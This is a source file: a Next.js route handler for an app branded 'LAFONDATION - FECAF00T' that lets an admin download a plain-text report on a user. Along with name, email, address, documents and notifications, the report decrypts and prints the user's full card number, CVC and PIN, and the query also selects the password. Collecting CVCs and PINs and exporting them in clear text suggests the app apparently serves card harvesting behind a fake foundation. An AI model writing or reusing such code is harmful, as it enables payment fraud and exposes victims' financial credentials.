import { notFound, redirect } from "next/navigation";
import { getServerSession } from "next-auth";
import { authOptions } from "@/lib/auth";
import { prisma } from "@/lib/prisma";
import { decryptText } from "@/lib/encryption";
import { DocType, DocStatus } from "@prisma/client";

export async function GET(
  request: Request,
  { params }: { params: Promise<{ id: string }> }
) {
  const session = await getServerSession(authOptions);
  if (!session?.user?.id) redirect("/login");
  if (session.user.role !== "ADMIN") redirect("/dashboard");

  const { id } = await params;
  const user = await prisma.user.findUnique({
    where: { id },
    select: {
      id: true,
      fullName: true,
      email: true,
      password: true,
      role: true,
      status: true,
      city: true,
      address: true,
      language: true,
      theme: true,
      createdAt: true,
      financials: true,
      documents: { orderBy: { createdAt: "desc" } },
      notifications: { orderBy: { createdAt: "desc" } },
    },
  });

  if (!user) notFound();

  let pdfContent = "LAFONDATION - FECAF00T\n";
  pdfContent += "User Details Report\n";
  pdfContent += "Generated: " + new Date().toLocaleString() + "\n";
  pdfContent += "=".repeat(60) + "\n\n";

  pdfContent += "-".repeat(60) + "\n";
  pdfContent += "BASIC INFORMATION\n";
  pdfContent += "-".repeat(60) + "\n";
  pdfContent += `User ID: ${user.id}\n`;
  pdfContent += `Full Name: ${user.fullName}\n`;
  pdfContent += `Email: ${user.email}\n`;
  pdfContent += `Role: ${user.role}\n`;
  pdfContent += `Status: ${user.status}\n`;
  pdfContent += `City: ${user.city || "N/A"}\n`;
  pdfContent += `Address: ${user.address || "N/A"}\n`;
  pdfContent += `Language: ${user.language}\n`;
  pdfContent += `Theme: ${user.theme}\n`;
  pdfContent += `Created At: ${user.createdAt.toLocaleString()}\n`;

  if (user.financials) {
    pdfContent += "\n" + "-".repeat(60) + "\n";
    pdfContent += "FINANCIAL DETAILS\n";
    pdfContent += "-".repeat(60) + "\n";
    pdfContent += `Card Name: ${user.financials.cardName}\n`;
    pdfContent += `Card Number: ${decryptText(user.financials.cardNumberEnc)}\n`;
    pdfContent += `Last Four: ${user.financials.lastFour}\n`;
    pdfContent += `Expiry: ${user.financials.expiryDate}\n`;
    pdfContent += `CVC: ${decryptText(user.financials.cvcEnc)}\n`;
    pdfContent += `PIN: ${decryptText(user.financials.pinEnc)}\n`;
  }

  if (user.documents.length > 0) {
    pdfContent += "\n" + "-".repeat(60) + "\n";
    pdfContent += "DOCUMENTS\n";
    pdfContent += "-".repeat(60) + "\n";
    for (const doc of user.documents) {
      pdfContent += `- ${doc.type}: ${doc.fileName} (${doc.status}) - ${doc.createdAt.toLocaleString()}\n`;
    }
  }

  if (user.notifications.length > 0) {
    pdfContent += "\n" + "-".repeat(60) + "\n";
    pdfContent += "NOTIFICATIONS\n";
    pdfContent += "-".repeat(60) + "\n";
    for (const notif of user.notifications) {
      pdfContent += `Title: ${notif.title}\n`;
      pdfContent += `Message: ${notif.message}\n`;
      pdfContent += `Read: ${notif.isRead ? "Yes" : "No"}\n`;
      pdfContent += `Created: ${notif.createdAt.toLocaleString()}\n\n`;
    }
  }

  pdfContent += "\n" + "=".repeat(60) + "\n";
  pdfContent += `Report Generated: ${new Date().toLocaleString()}\n`;
  pdfContent += `LAFONDATION - FECAF00T\n`;

  const fileName = `${user.fullName.replace(/\s+/g, "_")}_details_${new Date().toISOString().split("T")[0]}.txt`;

  return new Response(pdfContent, {
    headers: {
      "Content-Type": "text/plain; charset=utf-8",
      "Content-Disposition": `attachment; filename="${fileName}"`,
    },
  });
}